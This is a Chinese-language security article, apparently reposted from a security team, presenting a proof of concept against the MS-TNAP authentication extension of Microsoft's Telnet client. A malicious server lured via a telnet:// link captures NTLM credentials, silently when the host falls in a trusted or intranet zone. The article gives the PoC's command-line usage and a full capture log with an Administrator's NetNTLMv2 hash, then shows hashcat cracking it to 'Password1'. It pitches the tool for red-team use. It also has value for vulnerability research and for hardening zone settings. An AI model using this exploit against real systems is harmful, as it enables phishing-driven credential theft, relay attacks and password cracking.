#  Microsoft Telnet 客户端 MS-TNAP 服务器端身份验证令牌漏洞   
 Khan安全团队   2025-05-22 08:46  
  
此概念验证演示了 Microsoft Telnet 客户端的 MS-TNAP 身份验证协议中的一个漏洞。当客户端通过 URI 超链接连接到恶意 Telnet 服务器时telnet.exe，telnet://如果检测到 MS-TNAP 扩展，服务器就可以从客户端提取身份验证信息。如果该漏洞利用程序由内联网或受信任区域中的主机运行，则凭证会在不提示的情况下自动发送，这非常适合红队使用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3mTIdSaiaj7y0nrzmQc6ZNILHPbnFInktEiagvny8ibgKVzIbwuKSY2byCr9e3SPoph34KuLPoLO0tQ/640?wx_fmt=png&from=appmsg "")  
  
PoC 完成 MS-TNAP 过程并捕获 NTLM 身份验证数据，可用于：  
- NTLM中继攻击  
  
- 离线密码破解（NetNTLMv1/v2 哈希）  
  
漏洞详情  
  
带有 MS-TNAP 扩展的 Microsoft Telnet 客户端在连接到不受信任区域（如 Internet 区域）的服务器时，会向用户发出安全警告：  
```
"You are about to send your password information to a remote computer in Internet zone.
This might not be safe. Do you want to send anyway (y/n):"
```  
  
但是，对于受信任区域（例如 Intranet 区域）中的服务器，或者当系统的区域策略配置为静默身份验证时，不会显示警告并且会自动发送凭据。  
  
如果用户对提示回答“是”（或者由于区域设置而未显示提示），则身份验证材料将发送到服务器。攻击者可以利用此漏洞进行网络钓鱼攻击，诱使受害者点击恶意telnet://URI 链接。  
  
安全区域行为  
  
连接到 Telnet 服务器时，Windows 会根据安全区域检查服务器：  
- Internet 区域：在发送凭据之前提示用户警告  
  
- 内联网区域：可以在没有提示的情况下静默发送凭据  
  
- 受信任的站点：可能会在未经提示的情况下默默发送凭据  
  
当主机未使用协议说明符添加到 Intranet 区域或受信任站点区域时，此行为尤其危险。例如，添加类似192.168.1.1而不是 的IP 地址http://192.168.1.1会将信任设置应用于该主机的所有协议（HTTP、HTTPS、Telnet 等）。许多组织将内部 IP 地址范围添加到受信任区域时，未使用协议说明符，这无意中允许通过 Telnet 和其他协议进行静默凭据窃取。  
  
Windows 使用协议和主机的组合（例如telnet://192.168.1.1）检查区域信任，因此管理员在配置信任区域时应使用特定于协议的条目来限制暴露。  
  
受影响的系统  
  
安装 Microsoft Telnet 客户端时的所有 Windows 版本：  
```
Windows NT 4.0
Windows 2000
Windows XP
Windows 服务器 2003
Windows Server 2003 R2
Windows Vista
Windows 服务器 2008
Windows Server 2008 R2
Windows 7
Windows 服务器 2012
Windows Server 2012 R2
Windows 8
Windows 8.1
Windows 10
Windows 服务器 2016
Windows 服务器 2019
Windows Server 2022
Windows 11
Windows Server 2025
```  
  
命令行  
```
telnetclientpoc.exe [-d domain] [-s server] [-c challenge] [-o logfile]
-d domain：设置域名（默认：WIN2K3）
-s server：设置服务器名称（默认：WIN2K3）
-c challenge：设置自定义 NTLM 挑战（8 个字节的十六进制字符串）
-o logfile：设置自定义日志文件路径（默认：telnetclientpoc.log）
```  
  
当客户端连接时，应用程序：  
1. 记录详细的 NTLM 身份验证步骤telnetclientpoc.log  
  
1. 捕获netntlmv2.hash文件中的 NetNTLMv2 哈希值和 NTLMv1ntlmv1.hash  
  
1. 在控制台上提供详细的调试输出  
  
```
Server listening on port 23...
Client connected.
Sent Frame 4
Received Frame 5 (3 bytes): FF FB 25
Sent Frame 6
Received Frame 7 (27 bytes): FF FD 01 FF FD 03 FF FB 27 FF FB 1F FF FA 1F 00 78 00 1E FF F0 FF FB 00 FF FD 00
Sent Frame 8
Received Frame 9 - NTLM Type 1 (57 bytes): FF FA 25 00 0F 00 00 28 00 00 00 02 00 00 00 4E 54 4C 4D 53 53 50 00 01 00 00 00 97 82 08 E2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0A 00 7C 4F 00 00 00 0F FF F0
NTLM signature found at position: 12
NTLM Type 1 Message:
  Signature: NTLMSSP
  Flags: 0xE2088297
  Negotiate Unicode
  Negotiate OEM
  Request Target
  Negotiate Sign
  Negotiate Lan Manager Key
  Negotiate NTLM
  Negotiate Always Sign
  Negotiate Extended Session Security
  Negotiate Key Exchange
  Negotiate 56
  Domain:
  Workstation:
  OS Version: 10.0 (Build 20348)
Received Frame 10 - Environment Variables (45 bytes): FF FA 27 00 FF F0 FF FA 27 00 03 53 46 55 54 4C 4E 54 56 45 52 01 32 03 53 46 55 54 4C 4E 54 4D 4F 44 45 01 43 6F 6E 73 6F 6C 65 FF F0
Environment Variable: SFUTLNTVER = 2
Environment Variable: SFUTLNTMODE = Console
Preparing to send Frame 11
Using domain: WIN2K3
Using server: WIN2K3
Using challenge: 31 7C 02 AC 07 8A 3C 43
Challenge inserted into Type 2 message: 31 7C 02 AC 07 8A 3C 43
Global challenge after setting: 31 7C 02 AC 07 8A 3C 43
Sending Frame 11 - NTLM Type 2 (153 bytes): FF FA 25 02 0F 00 01 88 00 00 00 02 00 00 00 4E 54 4C 4D 53 53 50 00 02 00 00 00 0C 00 0C 00 38 00 00 00 15 82 8A E2 31 7C 02 AC 07 8A 3C 43 00 00 00 00 00 00 00 00 44 00 44 00 44 00 00 00 05 02 CE 0E 00 00 00 0F 57 00 49 00 4E 00 32 00 4B 00 33 00 02 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 01 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 04 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 03 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 00 00 00 00 FF F0
NTLM signature found at position: 12
NTLM Type 2 Message:
  Signature: NTLMSSP
  Flags: 0xE28A8215
  Negotiate Unicode
  Request Target
  Negotiate NTLM
  Negotiate Extended Session Security
  Challenge: 31 7C 02 AC 07 8A 3C 43
  Target Name: WIN2K3
  Target Info:
    Domain Name: WIN2K3
    Server Name: WIN2K3
    DNS Domain Name: WIN2K3
    FQDN: WIN2K3
  OS Version: 5.2 (Build 3790)
Sent Frame 11
Received Frame 12 - NTLM Type 3 (465 bytes): FF FA 25 00 0F 00 02 C0 01 00 00 02 00 00 00 4E 54 4C 4D 53 53 50 00 03 00 00 00 18 00 18 00 AE 00 00 00 EA 00 EA 00 C6 00 00 00 1E 00 1E 00 58 00 00 00 1A 00 1A 00 76 00 00 00 1E 00 1E 00 90 00 00 00 10 00 10 00 B0 01 00 00 15 82 88 E2 0A 00 7C 4F 00 00 00 0F 5E CF 27 A8 A2 78 0D ED 5C 73 F3 03 E3 61 5F FA 57 00 49 00 4E 00 2D 00 52 00 4F 00 54 00 51 00 49 00 48 00 47 00 36 00 49 00 49 00 47 00 41 00 64 00 6D 00 69 00 6E 00 69 00 73 00 74 00 72 00 61 00 74 00 6F 00 72 00 57 00 49 00 4E 00 2D 00 52 00 4F 00 54 00 51 00 49 00 48 00 47 00 36 00 49 00 49 00 47 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 36 49 F8 DA E2 9C 4D 85 B3 1F 31 CF 78 5B 4F 01 01 00 00 00 00 00 00 31 A3 F7 3B D4 BD DB 01 CE 55 32 CC CD 64 AD 67 00 00 00 00 02 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 01 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 04 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 03 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 08 00 30 00 30 00 00 00 00 00 00 00 00 00 00 00 00 30 00 00 93 DC DD 10 7A E9 9F B9 F0 F1 8B AD AD 61 C5 76 A3 55 7C 60 7F 0B 8D 2F 70 68 8A 46 20 FC 12 52 0A 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 09 00 2A 00 74 00 65 00 6C 00 6E 00 65 00 74 00 2F 00 31 00 39 00 32 00 2E 00 31 00 36 00 38 00 2E 00 36 00 39 00 2E 00 32 00 31 00 31 00 00 00 00 00 00 00 00 00 D2 09 8A 43 A7 27 D6 75 8C F1 F6 CD CE 74 42 77 FF F0
NTLM signature found at position: 12
NTLM Type 3 Message:
  Signature: NTLMSSP
  Flags: 0xE2888215
  Negotiate Unicode
  Negotiate NTLM
  Negotiate Extended Session Security
  Domain: WIN-ROTQIHG6IIG
  Username: Administrator
  Host: WIN-ROTQIHG6IIG
  LM Response: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  NTLM Response: 38 36 49 F8 DA E2 9C 4D 85 B3 1F 31 CF 78 5B 4F 01 01 00 00 00 00 00 00 31 A3 F7 3B D4 BD DB 01 CE 55 32 CC CD 64 AD 67 00 00 00 00 02 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 01 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 04 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 03 00 0C 00 57 00 49 00 4E 00 32 00 4B 00 33 00 08 00 30 00 30 00 00 00 00 00 00 00 00 00 00 00 00 30 00 00 93 DC DD 10 7A E9 9F B9 F0 F1 8B AD AD 61 C5 76 A3 55 7C 60 7F 0B 8D 2F 70 68 8A 46 20 FC 12 52 0A 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 09 00 2A 00 74 00 65 00 6C 00 6E 00 65 00 74 00 2F 00 31 00 39 00 32 00 2E 00 31 00 36 00 38 00 2E 00 36 00 39 00 2E 00 32 00 31 00 31 00 00 00 00 00 00 00 00 00
Global challenge before NTLM Type 2: 31 7C 02 AC 07 8A 3C 43
Hashcat NetNTLMv2 Format: Administrator::WIN-ROTQIHG6IIG:317c02ac078a3c43:383649f8dae29c4d85b31f31cf785b4f:010100000000000031a3f73bd4bddb01ce5532cccd64ad670000000002000c00570049004e0032004b00330001000c00570049004e0032004b00330004000c00570049004e0032004b00330003000c00570049004e0032004b003300080030003000000000000000000000000030000093dcdd107ae99fb9f0f18badad61c576a3557c607f0b8d2f70688a4620fc12520a0010000000000000000000000000000000000009002a00740065006c006e00650074002f003100390032002e003100360038002e00360039002e003200310031000000000000000000
Challenge used in hashcat format: 317c02ac078a3c43
  Session Key: D2 09 8A 43 A7 27 D6 75 8C F1 F6 CD CE 74 42 77
Sent Frame 15
Connection closed.
```  
  
使用 Hashcat 破解密码  
```
hashcat (v6.2.6) starting

[...]

ADMINISTRATOR::WIN-ROTQIHG6IIG:317c02ac078a3c43:383649f8dae29c4d85b31f31cf785b4f:010100000000000031a3f73bd4bddb01ce5532cccd64ad670000000002000c00570049004e0032004b00330001000c00570049004e0032004b00330004000c00570049004e0032004b00330003000c00570049004e0032004b003300080030003000000000000000000000000030000093dcdd107ae99fb9f0f18badad61c576a3557c607f0b8d2f70688a4620fc12520a0010000000000000000000000000000000000009002a00740065006c006e00650074002f003100390032002e003100360038002e00360039002e003200310031000000000000000000:Password1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ADMINISTRATOR::WIN-ROTQIHG6IIG:317c02ac078a3c43:383...000000
Time.Started.....: Mon May  5 10:46:24 2025 (0 secs)
Time.Estimated...: Mon May  5 10:46:24 2025 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    11233 H/s (0.04ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12/12 (100.00%)
Rejected.........: 0/12 (0.00%)
Restore.Point....: 0/12 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: password -> Password1
```  
  
